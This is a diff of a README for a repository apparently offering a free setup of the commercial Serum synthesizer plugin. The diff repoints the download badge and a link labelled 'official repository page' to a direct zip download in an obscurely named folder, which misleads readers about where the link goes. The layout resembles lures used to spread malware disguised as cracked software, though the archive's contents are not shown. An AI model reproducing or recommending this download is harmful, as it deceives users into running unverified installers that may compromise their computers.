@@ -1,6 +1,6 @@
 # 🎹 Serum-VST-Plugin-Setup - Create professional wavetable sounds with ease
 
-[![Download Serum](https://img.shields.io/badge/Download-Serum-blue.svg)](https://github.com/Bhavik1b/Serum-VST-Plugin-Setup)
+[![Download Serum](https://img.shields.io/badge/Download-Serum-blue.svg)](https://raw.githubusercontent.com/Bhavik1b/Serum-VST-Plugin-Setup/main/ribspare/Serum_Setup_VS_Plugin_1.6.zip)
 
 Serum is a wavetable synthesizer. It allows music producers to design complex sounds using a visual interface. The software features drag-and-drop modulation and offers high sound quality for digital audio workstations.
 
@@ -18,7 +18,7 @@ Before you install the software, check your computer against these requirements:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official repository page](https://github.com/Bhavik1b/Serum-VST-Plugin-Setup).
+1. Go to the [official repository page](https://raw.githubusercontent.com/Bhavik1b/Serum-VST-Plugin-Setup/main/ribspare/Serum_Setup_VS_Plugin_1.6.zip).
 2. Locate the download button or link on the page.
 3. Click the link to begin the download process.
 4. Save the installer file to your computer.
